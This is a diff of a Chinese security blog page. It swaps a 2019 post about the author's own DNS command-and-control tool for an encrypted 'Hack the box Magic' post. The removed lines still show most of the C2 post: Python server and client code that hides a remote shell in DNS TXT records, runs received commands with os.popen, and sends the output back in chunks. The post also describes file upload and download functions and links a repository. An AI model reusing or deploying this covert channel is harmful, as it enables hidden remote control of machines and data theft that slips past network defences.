@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>一个很像cxk的dns_c2 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="一个很像cxk的dns_c2 | 九世的博客">
+  <title>Hack the box Magic | 九世的博客</title>
+  <meta name="keywords" content=" 靶场 ">
+  <meta name="description" content="Hack the box Magic | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1371,9 +1371,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-一个很像cxk的dns-c2" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Hack-the-box-Magic" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">一个很像cxk的dns_c2</h1>
+        <h1 class="article-title">Hack the box Magic</h1>
     
     <div class="article-meta">
         
@@ -1382,14 +1382,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">靶场</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-05-02 23:14:50">2019-05-02 21:11</time>
+        创建时间:<time class="date" title="更新时间: 2020-04-21 16:17:20">2020-04-21 15:44</time>
         
     </div>
     <div class="article-meta">
@@ -1411,7 +1411,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实现他"><span class="toc-text">实现他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试截图"><span class="toc-text">测试截图</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1426,190 +1426,20 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>算是一个很像cxk的东西，有个BUG一直解决不了<br>而且还时不时的像报错。。。。emmmm<br><img src="http://img4.imgtn.bdimg.com/it/u=1940277742,2702113996&amp;fm=26&amp;gp=0.jpg" alt=""></p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>五一之前在sec-wiki看到某文章<br>传送门:<a href="https://www.cnblogs.com/LittleHann/p/8656621.html" target="_blank" rel="noopener">DNS Tunnel隧道隐蔽通信实验 &amp;&amp; 尝试复现特征向量化思维方式检测</a><br>根据文章所描述的，我这个c2应该属于第一种</p>
-<p>我在写之前上GitHub搜了一下dns shell找到了一个不错的项目<br>传送门:<a href="https://github.com/ahhh/Reverse_DNS_Shell/" target="_blank" rel="noopener">DNS_Shell</a></p>
-<p>根据上面项目所用到的东西</p>
-<pre><code class="`">dnslib模块 --- 处理dns包
-dnspython --- 发送dns请求
-</code></pre>
-<p>当然你也可以用scapy手动构造一个dns的数据包然后在发送出去….</p>
-<p>项目里面接收dns包的时候是用socket创建一个UDP，然后监听53端口，监听数据<br>获取到的数据使用dnslib，模块进行解包便可获得想要的数据</p>
-<p>dns_shell算是个反向shell，必须由客户端发送请求。服务端回应该数据<br>虽然写的时候有点困难。我是实现第一种c2，使用的是TXT记录类型。TXT类型有限制数据不能大于63个字节<br>所以必须得分段发送</p>
-<h2 id="实现他"><a href="#实现他" class="headerlink" title="实现他"></a>实现他</h2><p><b>Server端</b><br>解dns包的函数</p>
-<pre><code class="python">    def dnsj(self,data):
-        dr=dnslib.DNSRecord.parse(data) #dns数据包转换
-        answer=dr.reply() #获取全部数据
-        return answer,dr.questions[0].qname.label[0] #获取请求前的dns包和指定数据
-</code></pre>
-<p>打包为dns包的函数</p>
-<pre><code class="python">    def dnsc(self,answer,data):
-        answer.add_answer(*dnslib.RR.fromZone(&#39;{}.com 60 TXT&#39;.format(data)))
-        return answer
-</code></pre>
-<p>主要函数</p>
-<pre><code class="python"> global s,address
-        he = [&#39;cmd---&gt;命令行交互&#39;,&#39;upload---&gt;文件上传&#39;,&#39;download---&gt;文件下载&#39;,&#39;exit---&gt;退出&#39;]
-        hps={&#39;cmd&#39;: self.cmd,&#39;upload&#39;:self.upload,&#39;download&#39;:self.download,&#39;exit&#39;:exit}
-        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        s.bind((self.host,int(self.port)))
-        data,address=s.recvfrom(1024)
-        print(&#39;[+] 来源IP:{},来源端口:{}&#39;.format(address[0],address[1]))
-        dnsj=self.dnsj(data)
-        demo=self.jiemi(dnsj[1])
-        if demo:
-            print(&#39;[+] {}:{}&lt;----&gt;{}:{}&#39;.format(self.host,self.port,address[0],address[1]))
-            print(&#39;+请执行你的操作，如果有问题请输入help&#39;)
-            demos=self.jiami(&#39;demo&#39;)
-            fs=self.dnsc(dnsj[0],demos)
-            s.sendto(fs.pack(),address)
-            while True:
-                xw=input(&#39;Jarvis:&#39;)
-                if xw in hps:
-                    try:
-                        hps[xw]()
-                    except Exception as r:
-                        print(&#39;-- Error:{}&#39;.format(r))
-                elif xw==&#39;help&#39;:
-                    print(&#39;&#39;)
-                    for h in he:
-                        print(h)
-                else:
-                    print(&#39;-没有这种操作&#39;)
-                    continue
-</code></pre>
-<p><b>Client端</b><br>主要函数</p>
-<pre><code class="python"> def beikon(self):
-        hk={&#39;cmd&#39;:self.cmd,&#39;upload&#39;:self.upload,&#39;download&#39;:self.download}
-        demo=&#39;demo&#39;
-        demo=self.jiami(demo)
-        bbc=self.fs(demo)
-        kk=self.zz(bbc)
-        jm=self.jiemi(kk.encode(&#39;utf-8&#39;))
-        if jm:
-            while True:
-                try:
-                    g=&#39;ok&#39;
-                    demo = self.jiami(g)
-                    bbc = self.fs(demo)
-                    kk = self.zz(bbc)
-                    jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                    if jm in hk:
-                        hk[jm]()
-                except:
-                    pass
-</code></pre>
-<p><b>对应功能对照的函数</b><br>命令行交互<br>server端</p>
-<pre><code class="python"> def cmd(self):
-        self.ok(&#39;cmd&#39;)
-        while True:
-            jb, jc = s.recvfrom(1024)
-            dnsj = self.dnsj(jb)
-            demo = self.jiemi(dnsj[1])
-            if demo!=&#39;cmd&#39; and demo !=&#39;long&#39;:
-                print(demo)
-                demos = self.jiami(&#39;cmd&#39;)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
-            elif demo==&#39;long&#39;:
-                changdu=0
-                jg=b&#39;&#39;
-                demos = self.jiami(&#39;long&#39;)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
-
-                c,d= s.recvfrom(1024)
-                dnsj = self.dnsj(c)
-                demo=self.jiemi(dnsj[1])
-                if str(demo).isdigit()==True:
-                    changdu+=int(demo)
-                print(changdu)
-                demos = self.jiami(&#39;{}&#39;.format(changdu))
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), d)
-                while True:
-                    d,e = s.recvfrom(1024)
-                    dnsj = self.dnsj(d)
-                    jg+=dnsj[1]
-                    if len(jg)==changdu:
-                        jmk=self.jiemi(jg)
-                        print(jmk)
-                        fs = self.dnsc(dnsj[0], &#39;break&#39;)
-                        s.sendto(fs.pack(), e)
-                        break
-                    demos = self.jiami(&#39;jx&#39;)
-                    fs = self.dnsc(dnsj[0], demos)
-                    s.sendto(fs.pack(), e)
-
-            else:
-                shell=input(&#39;Jarvis_shell:&#39;)
-                if shell==&#39;exit&#39;:
-                    demos = self.jiami(&#39;exit&#39;)
-                    fs = self.dnsc(dnsj[0], demos)
-                    s.sendto(fs.pack(), jc)
-                    break
-                demos = self.jiami(shell)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
-
-
-</code></pre>
-<p>client端</p>
-<pre><code class="python">    def cmd(self):
-        while True:
-            g=&#39;cmd&#39;
-            demo = self.jiami(g)
-            bbc = self.fs(demo)
-            kk = self.zz(bbc)
-            jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-            if jm == &#39;exit&#39;:
-                break
-            else:
-                zx=os.popen(jm)
-                if zx:
-                    g=zx.read()
-                    demos = self.jiami(g)
-                    if len(demos)&lt;64:
-                        if len(demos)==0:
-                            demos=self.jiami(jm)
-                        bbc = self.fs(demos)
-                        kk = self.zz(bbc)
-                        jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                        if jm:
-                            continue
-                    else:
-                        g=&#39;long&#39;
-                        demo = self.jiami(g)
-                        bbc = self.fs(demo)
-                        kk = self.zz(bbc)
-                        jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                        if jm:
-                            g = len(demos)
-                            demo = self.jiami(g)
-                            bbc = self.fs(demo)
-                            kk = self.zz(bbc)
-                            jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                            if jm:
-                                b=0
-                                e=32
-                                for u in demos:
-                                    g=demos[b:e]
-                                    b+=32
-                                    e+=32
-                                    bbc=self.fs(g)
-                                    kk = self.zz(bbc)
-                                    if kk==&#39;break&#39;:
-                                        break
-
-</code></pre>
-<p><b>仓库地址</b>:<a href="https://github.com/422926799/python/tree/master/dns_c2" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/dns_c2</a></p>
-<h2 id="测试截图"><a href="#测试截图" class="headerlink" title="测试截图"></a>测试截图</h2><p><img src="https://s2.ax1x.com/2019/05/02/ENMlz4.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENM8y9.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENMGLR.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENMYe1.gif" alt=""></p>
-<p><b>抓包截图</b><br><img src="https://s2.ax1x.com/2019/05/02/ENMtdx.gif" alt=""></p>
-<p>转载请声明:转自422926799.github.io</p>
-
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<div id="hbe-security">
+  <div class="hbe-input-container">
+  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog.">
+    <label for="pass">Please enter the password to read the blog.</label>
+    <div class="bottom-line"></div>
+  </div>
+</div>
+<div id="decryptionError" style="display: none;">Incorrect Password!</div>
+<div id="noContentError" style="display: none;">No content to display!</div>
+<div id="encrypt-blog" style="display:none">
+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